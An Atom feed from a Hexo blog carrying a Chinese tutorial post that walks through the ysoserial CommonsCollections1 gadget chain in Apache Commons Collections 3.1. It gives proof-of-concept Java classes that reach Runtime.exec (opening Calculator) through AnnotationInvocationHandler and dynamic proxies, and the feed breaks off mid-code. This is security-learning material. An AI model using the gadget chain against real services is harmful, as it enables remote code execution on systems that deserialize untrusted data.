<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ontheway&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-28T12:19:33.540Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ontheway</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java 反序列化入门（二）</title>
    <link href="http://example.com/2021/04/28/Getting-Started-with-Java-Deserialization-2/"/>
    <id>http://example.com/2021/04/28/Getting-Started-with-Java-Deserialization-2/</id>
    <published>2021-04-28T12:09:42.000Z</published>
    <updated>2021-04-28T12:19:33.540Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文仍以 Apache Commons Collections 反序列化为例，分析 ysoserial 中的 CommonsCollections1 利用链。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1、漏洞复现环境"><a href="#1、漏洞复现环境" class="headerlink" title="1、漏洞复现环境"></a>1、漏洞复现环境</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jdk 7 / Apache Commons Collections 组件版本如下 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、代码分析"><a href="#2、代码分析" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><p>由于漏洞原理一样，只是利用链不同，已经解释过的就不再重复介绍。</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 上一篇文章利用链为</span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    -&gt; TiedMapEntry.toString()</span><br><span class="line">        -&gt; LazyMap.get()</span><br><span class="line">            -&gt; ChainedTransformer.transform()</span><br><span class="line">                -&gt; ConstantTransformer.transform()</span><br><span class="line">                -&gt; InvokerTransformer.transform()</span><br><span class="line">                    -&gt; Method.invoke()</span><br><span class="line">                        -&gt; Class.getMethod()</span><br><span class="line">                -&gt; InvokerTransformer.transform()</span><br><span class="line">                    -&gt; Method.invoke()</span><br><span class="line">                        -&gt; Runtime.getRuntime()</span><br><span class="line">                -&gt; InvokerTransformer.transform()</span><br><span class="line">                    -&gt; Method.invoke()</span><br><span class="line">                        -&gt; Runtime.exec()</span><br><span class="line">&#x2F;&#x2F; 本篇文章的利用链不再使用 TiedMapEntry.toString() 来触发 LazyMap.get()</span><br></pre></td></tr></table></figure><p>既然不使用 <strong>TiedMapEntry</strong> 的 toString 方法了，我们就要寻找新的方式来执行 <strong>LazyMap</strong> 的 get 方法。</p><p><strong>sun.reflect.annotation.AnnotationInvocationHandler</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<span class="comment">// 创建这个对象时我们可以传入 LazyMap 对象，赋值给 memberValues</span></span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;<span class="comment">// 这个方法里有机会使用我们传入的 LazyMap 对象调用 get 方法</span></span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span> var7 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);<span class="comment">// 我们需要想办法进入这个逻辑</span></span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读 <strong>AnnotationInvocationHandler</strong> 代码可知，我们可以通过调用 invoke 方法来调用 LazyMap.get()，写个测试样例构造一下，代码如下 Test1.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        <span class="comment">// ----- 分割线 ----- 前半部分代码不再重复解释</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">// 由于 AnnotationInvocationHandler 不是一个 public 的类，所以只能使用反射的方式来创建</span></span><br><span class="line">            Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);<span class="comment">// 获取私有的构造方法</span></span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);<span class="comment">// 日常抑制 java 语法访问检查</span></span><br><span class="line">            handler = (InvocationHandler)constructor.newInstance(Override.class,lazyMap);<span class="comment">// 创建 AnnotationInvocationHandler 对象，重点在于第二个参数，第一个参数只需要选择一个合法的参数即可</span></span><br><span class="line">            Method method = clazz.getDeclaredMethod(<span class="string">&quot;hashCodeImpl&quot;</span>);<span class="comment">// 我们在 AnnotationInvocationHandler 类中随便找一个能够进入目标逻辑的方法获取一下</span></span><br><span class="line">            handler.invoke(<span class="keyword">null</span>,method,<span class="keyword">null</span>);<span class="comment">// 利用 invoke 调用 lazyMap.get()，成功弹出计算器</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们的目标就是寻找能够触发 AnnotationInvocationHandler.invoke() 的方式。</p><p>所有使用动态代理创建的实例无论在调用什么方法,都会优先调用 invoke 方法，那么继续优化代码来测试 Test2.java:</p><p>如果不能理解上面的描述，就需要补充一些动态代理的知识：</p><ul><li>什么是动态代理 -&gt; <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">动态代理 - 廖雪峰的官方网站</a></li><li>Proxy.newProxyInstance 介绍 -&gt; <a href="https://blog.csdn.net/yaomingyang/article/details/80981004">Java动态代理InvocationHandler和Proxy学习笔记</a></li><li>为何会优先调用 inovke 方法 -&gt; <a href="https://blog.csdn.net/qq_39056197/article/details/102598674">jdk动态代理invoke方法自动运行原因</a></li><li>动态代理如何创建代理实例 -&gt; <a href="https://zhuanlan.zhihu.com/p/45299858">JDK动态代理-超详细源码分析（二）</a></li><li>类加载器的选择(类加载器对于代理实例的影响目前还不清楚) -&gt; <a href="https://www.v2ex.com/t/596995">Java 动态代理 Proxy.newProxyInstance 第一个参数到底该用哪个类的类加载器啊？</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        InvocationHandler handler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            handler = (InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">            <span class="comment">// ----- 分割线 ----- 前半部分代码不再重复解释</span></span><br><span class="line">            Map proxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;, handler);<span class="comment">// 创建代理的对象</span></span><br><span class="line">            <span class="comment">// List proxy = (List) Proxy.newProxyInstance(null,new Class[]&#123;List.class&#125;,handler);// 如果理解了动态代理，你会发现代理什么接口都可以！！！</span></span><br><span class="line">            proxy.clear();<span class="comment">// 任意执行一个方法，严格来说也不是任意，我们还要让 invoke 进入指定的逻辑，有好几个方法可以利用，这里我选用了 Map.clear()，成功弹出计算器</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们只需要想办法调用 <strong>动态代理出来的实例</strong> 中的方法，就达成目标了！</p><p><strong>sun.reflect.annotation.AnnotationInvocationHandler</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<span class="comment">// 依旧是 AnnotationInvocationHandler 类，我们可以控制 memberValues 的值</span></span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<span class="comment">// 在反序列化时会调用该方法</span></span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">// 这里的 this.memberValues.entrySet() 如果是代理类调用就能够触发 invoke 方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是 <strong>AnnotationInvocationHandler</strong> 类，只需要调用它的 readObject 方法即可达成我们的目标。</p><p>反射链已经满足条件，POC 代码如下 Test3.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class 